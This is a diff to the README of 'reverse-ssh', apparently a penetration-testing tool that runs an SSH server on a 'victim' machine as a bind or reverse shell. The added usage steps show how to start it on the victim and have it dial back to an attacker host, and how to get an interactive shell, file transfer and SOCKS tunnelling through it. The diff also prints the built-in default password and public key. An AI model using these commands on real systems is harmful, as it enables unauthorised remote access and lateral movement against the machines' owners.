@@ -52,52 +52,81 @@ Compiling additionally requires the following:
 
 ## Usage
 
-Once `reverse-ssh` is running on the victim, you can connect with any username and the default password `letmeinbrudipls`, the ssh key or whatever you specified during compilation.
-After all, it is just an ssh server:
+#### Bind connection
+
+1. Start listening on the victim
+```
+# Basic usage (default port is 31337)
+victim$ ./reverse-ssh -l
+
+# Set a custom listening port and password
+victim$ ./reverse-ssh -l -p 9001 -P MySuperPassword
+
+# Set a custom pubkey
+victim$ ./reverse-ssh -l -p 9999 -k id_rsa.pub
+```
+
+2. Connect to the victim
+```
+#Basic usage
+attacker$ ssh -p 31337 root@victim
+
+#With custom port (password will be asked, default is letmeinbrudipls)
+attacker$ ssh -p 9001 root@victim
+
+#With custom pubkey
+attacker$ ssh -p 9999 -i id_rsa root@victim
+```
+
+#### Reverse connection
+
+1. Start listening on the attacker side
+```
+# Basic usage
+attacker$ ./reverse-ssh -l
+
+# Set a custom password and connexion port
+attacker$ ./reverse-ssh -l -p 9001 -P MySuperPassword
+```
+
+2. Connect from the victim to the attacker
+```
+# Basic usage
+victim$ ./reverse-ssh root@attacker
+
+# Use a custom connexion port and password
+victim$ ./reverse-ssh -p 9001 -P MySuperPassword root@attacker
+
+# Use a custom binding port and pubkey
+victim$ ./reverse-ssh -b 1234 -k id_rsa.pub root@attacker
+```
+
+3. Use ssh
+Once the tunnel victim <-> attacker is established, connect to the local port that redirect to the victim
+```
+#Basic usage (default binding port is 8888)
+attacker$ ssh -p 8888 root@127.0.0.1
+
+#With custom binding port and keyfile
+attacker$ ssh -p 1234 -i id_rsa root@127.0.0.1
+```
+
+#### SSH usage
 
 ```
-# Fully interactive shell access
-$ ssh -p <RPORT> <RHOST>
+# Depending on bind/reverse connection and custom parameters, don't forget to adjust your commands
 
-# Simple command execution
-$ ssh -p <RPORT> <RHOST> whoami
+# Fully interactive shell access
+$ ssh root@127.0.0.1
 
 # Full-fledged file transfers
-$ sftp -P <RPORT> <RHOST>
+$ scp -P <PORT> somefile root@127.0.0.1:/tmp/somefile
 
 # Dynamic port forwarding as SOCKS proxy on port 9050
-$ ssh -p <RPORT> -D 9050 <RHOST>
-```
+$ ssh -D 9050 root@127.0.0.1
 
-### Running ReverseSSH as bind shell
-
-```
-# Victim
-victim$ ./reverse-ssh
-
-# Attacker (default password: letmeinbrudipls)
-attacker$ ssh -p 31337 <RHOST>
-```
-
-### Running ReverseSSH as reverse shell
-
-Note: you can compile ReverseSSH with parameters for LHOST and LPORT to ease execution on the target, [see below](#build-tricks)
-
-```
-# On attacker (get ready to catch the incoming request;
-# can be omitted if you already have an ssh daemon running, e.g. OpenSSH)
-# NOTE: LPORT of 8888 collides with incoming connections; use the flag `-b 8889` or similar on the victim in that case
-attacker$ ./reverse-ssh -v -l -p <LPORT>
-
-# On victim
-victim$ ./reverse-ssh -p <LPORT> <LHOST>
-# or in case of an ssh daemon listening at port 22 with password authentication for user 'kali'
-victim$ ./reverse-ssh -p 22 kali@<LHOST>
-
-# On attacker (default password: letmeinbrudipls)
-attacker$ ssh -p 8888 127.0.0.1
-# or with ssh config from below
-attacker$ ssh target
+# If you specified a custome keyfile with -k
+$ ssh -i keyfile.private root@127.0.0.1
 ```
 
 In the end it's plain ssh, so you could catch the remote port forwarding call coming from the victim's machine with your openssh daemon listening on port 22.
@@ -124,14 +153,14 @@ reverseSSH v1.2.0  Copyright (C) 2021  Ferdinor <ferdinor@mailbox.org>
 Usage: reverse-ssh [options] [[<user>@]<target>]
 
 Examples:
-  Bind:
+  Listen:
         reverse-ssh -l
         reverse-ssh -v -l -p 4444
-  Reverse:
+  Connect:
         reverse-ssh 192.168.0.1
         reverse-ssh kali@192.168.0.1
         reverse-ssh -p 31337 192.168.0.1
-        reverse-ssh -v -b 0 kali@192.168.0.2
+        reverse-ssh -v -b 1234 kali@192.168.0.2
 
 Options:
         -l, Start reverseSSH in listening mode (overrides reverse scenario)
@@ -143,16 +172,13 @@ Options:
                 enhance pre-Windows10 shells (e.g. '-s ssh-shellhost.exe' if in same directory)
         -N, Deny all incoming shell/exec/subsystem and local port forwarding requests
                 (if only remote port forwarding is needed, e.g. when catching reverse connections)
+        -P, Password for the ssh session (default: letmeinbrudipls)
+        -k, PubKey, as string or filename (default: ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlbJwr+ueQ0gojy4QWr2sUWcNC/Y9eV9RdY3PLO7Bk/ Brudi)
         -v, Emit log output
 
 <target>
         Optional target which enables the reverse scenario. Can be prepended with
         <user>@ to authenticate as a different user other than 'reverse' while dialling home
-
-Credentials:
-        Accepting all incoming connections from any user with either of the following:
-         * Password "letmeinbrudipls"
-         * PubKey   "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKlbJwr+ueQ0gojy4QWr2sUWcNC/Y9eV9RdY3PLO7Bk/ Brudi"
 ```
 
 
